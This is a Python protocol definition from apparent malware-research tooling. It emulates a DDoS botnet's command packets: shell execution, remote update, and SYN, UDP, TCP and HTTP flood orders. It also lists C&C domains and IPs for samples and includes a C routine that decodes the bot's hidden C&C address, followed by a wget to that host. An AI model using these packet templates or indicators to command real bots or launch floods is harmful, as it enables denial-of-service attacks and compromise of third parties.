#!/bin/python
###############################################
# File Name : jiemi.py
#    Author : rootkiter
#    E-mail : rootkiter@rootkiter.com
#   Created : 2017-03-20 18:58:02
###############################################

from simulator import PackBase

class model(PackBase):
    # register config 
    _registersize=0x5b4
    _reg_member={
        "cmdgroup"    :[  "u32" ,  0x00    , 5              ],
    }
    # if has ping_pong packet
    _pingcheck={
        "cmdgroup":0x10002,
    }

    # cmd packet config
    _cmdlen=0x5b4
    _cmd_members={
        #  field-name  ,  type  ,  offset  , default_value 
        "cmdgroup"    :[  "u32" ,  0x00    , 0x10005        ],

        "cmdstr"      :[  "str" ,  0x190  , "exitself"      ],
        "downurl"     :[  "str" ,  0x197  , "http://rootkiter.com/EarthWorm/download/ew.zip"],
        
        "cmdarg2"     :[  "u32" ,  0x590  , 0],
        "atk_way"     :[  "u32" ,  0x590  , 2],
        "atk_thread"  :[  "u32" ,  0x5A0  , 1],
        "atk_target"  :[  "str" ,  0x110  , "192.168.119.1"],
        "atk_port"    :[  "u32" ,  0x594  , 8888],
        "udp_len"     :[  "u32" ,  0x5A4  , 100],
        
        "udp_sleep"   :[  "u32" ,  0x59C  , 3],
        "syn_sleep"   :[  "u32" ,  0x59C  , 3],
        "sleep"       :[  "u32" ,  0x59C  , 3],


        
        "http_target" :[  "str" ,  0x110  , "http://192.168.119.1:8888/hello.index"],
        "http_hostIP" :[  "u32" ,  0x5B0  , 0x0177A8C0],
        "http_port2"  :[  "u16" ,  0x594  , 8887 ],
        "http_sleep"  :[  "u32" ,  0x59C  , 3  ],
        "http_pool"   :[  "u32" ,  0x5AC  , 3  ],
    }

    # one case for one cmd packet
    _testcase={
        "exitself":{
                "fieldname":["cmdgroup","cmdstr"],
                "valuefix" :{"cmdgroup":"0x10005","cmdstr":"exitself"}
        },
        "killself":{
                "fieldname":["cmdgroup","cmdstr"],
                "valuefix" :{"cmdgroup":"0x10005","cmdstr":"killself"}
        },
        "update":{
                "fieldname":["cmdgroup","cmdstr","downurl"],
                "valuefix" :{"cmdgroup":"0x10005","cmdstr":"update"}
        },
        "shell":{
                "fieldname":["cmdgroup","cmdarg2","cmdstr"],
                "valuefix" :{"cmdstr":"ls -l > result.txt"}
        },
        "exec":{
                "fieldname":["cmdgroup","cmdarg2","cmdstr"],
                "valuefix" :{"cmdarg2":"1","cmdstr":"/bin/sh -c \"ls -l > result.txt\""},
                "acksize"  :0x5b4
        },
        "tcp_conn":{
                "fieldname":["cmdgroup","atk_way","atk_thread","atk_port","sleep","atk_target"],
                "valuefix" :{"cmdgroup":"0x10003","atk_way":"1"}
        },
        "syn":{
                "fieldname":["cmdgroup","atk_way","atk_thread","atk_target","atk_port","udp_len","syn_sleep"],
                "valuefix" :{"cmdgroup":"0x10003","atk_way":"3"}
        },
        "udp":{
                "fieldname":["cmdgroup","atk_way","atk_thread","atk_port","udp_sleep","atk_target","udp_len"],
                "valuefix" :{"cmdgroup":"0x10003","atk_way":"2"}
        },
        "http":{
                "fieldname":["cmdgroup","atk_way","atk_thread","http_port2","http_sleep","http_target","http_hostIP"],
                "valuefix" :{"cmdgroup":"0x10003","atk_way":"4"}
        },
        "stop":{
                "fieldname":["cmdgroup"],
                "valuefix" :{"cmdgroup":"0x10004"}
        }
    }

    _samples={
        'A16A281CBE544AF40F8463C7F5186496':{"C&C1":"bak.hnhxzz.com,bak1.hnhxzz.com,dd.1ddos.pw,192.154.108.2:77"},
        '6500E8925CAB0F62E4F80CD9C9582C9A':{"C&C1":"bak2.hnhxzz.com,162.250.140.82"},
        'BEB44950D87C418FF08E00D0C20326E0':{"112.168.11.161:999"},
    }

    otherinfo='''
    /*
     * ==========================================================
     *
     *       Filename:  main.c
     *         Author:  rootkiter
     *         E-Mail:  rootkiter@rootkiter.com
     *
     * ==========================================================
     */
    #include "stdio.h"
    #include <string.h>

    int jiemihttp(char *table){
        int len = strlen(table);
        for(int i=0;i<len;i++){
            if(i%3){
                table[i] += i%3;
            }
            else{
                table[i] -- ;
            }
        }
        return 1;
    }

    int main(){
        /// file_md5 = BEB44950D87C418FF08E00D0C20326E0
        char table[]="\x63\x60\x69\x2F\x67\x6C\x69\x77\x78\x7B\x2D\x61\x70\x6C\x2D\x6A\x6F\x2F\x2F\x73\x76\x75";
        int res = jiemihttp(table);
        printf("%d\n",res);
        printf("%s\n",table);
        /// jiemi result = "bak.hnhxzz.com/ip1.txt"
        /// $ wget bak.hnhxzz.com/ip1.txt
        /// $ cat ip1.txt
        /// !@#112.168.11.161:999
        return 0;
    }
    '''